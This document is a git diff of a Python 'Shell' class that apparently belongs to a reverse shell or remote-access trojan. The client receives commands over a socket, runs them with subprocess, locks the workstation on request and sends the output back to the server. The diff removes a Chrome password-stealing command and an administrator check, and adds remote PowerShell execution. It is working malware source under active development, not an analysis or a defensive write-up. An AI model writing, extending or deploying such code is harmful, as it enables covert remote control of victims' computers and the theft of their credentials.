@@ -2,7 +2,6 @@ import os
 import socket
 import subprocess
 import ctypes
-import cp
 
 
 class Shell:
@@ -22,7 +21,7 @@ class Shell:
         """
         Executes received commands from the server and sends the output back through the socket
         """
-        check_admin_flag = False
+
         while 1:  # Infinite loop
             try:
                 # Gets cwd and sends to server
@@ -56,16 +55,10 @@ class Shell:
                 if data == "lock":
                     ctypes.windll.user32.LockWorkStation()
                     data = "echo Screen locked"
-                
-                # Gets all chrome passwords
-                if data == "get chrome pass":
-                    data = "echo " + cp.get_chrome_pass()
-                    # cp.get_chrome_pass()
-                    
-                # Checks if client has admin rights
-                if data == "check admin":
-                    check_admin_flag = True
-                    data = "echo %ERRORLEVEL%"
+
+                # Executes command with powershell
+                if data[:2] == "PS":
+                    data = "PowerShell.exe -command {}".format(data[3:])
 
                 if len(data) > 0:
                     # Executes arbitrary command
@@ -73,16 +66,6 @@ class Shell:
                                             stdin=subprocess.PIPE)
                     stdout_value = proc.stdout.read() + proc.stderr.read()
                     output_str = str(stdout_value, "UTF-8")
-                    
-                    # To check if user has admin privileges
-                    if check_admin_flag:
-                        if output_str == "0":
-                            output_str = "You ARE an administrator"
-                        else:
-                            output_str = "You are NOT an administrator"
-                        
-                        # Reset flag
-                        check_admin_flag = False
 
                     # Sends output back to server
                     self.sock.send(str.encode("\n" + output_str))
